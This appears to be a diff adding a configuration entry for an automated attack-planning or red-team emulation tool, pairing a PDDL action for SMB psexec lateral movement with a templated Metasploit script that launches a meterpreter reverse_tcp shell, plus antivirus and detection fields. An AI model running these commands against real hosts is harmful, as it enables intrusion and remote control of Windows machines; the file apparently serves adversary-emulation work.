@@ -1,0 +1,31 @@
+[pddl]
+    (:action exploit/windows/smb/psexec
+        :parameters (?from ?to)
+        :precondition (and
+            (located ?from)
+            (connected ?from ?to)
+            (exploited ?from)
+            (cred-smb ?to)
+            (port-445 ?to)
+        )
+        :effect (and
+            (not (located ?from))
+            (located ?to)
+            (exploited ?to)
+        )
+    )
+
+[script]
+|> msf
+use exploit/windows/smb/psexec
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set RHOSTS {RHOSTS}
+set LHOST {LHOST}
+exploit -z
+
+[evc]
+
+[evd]
+AVS: Apex One, Clam AV
+NIDS: *
+LOG: Q=1, A=3
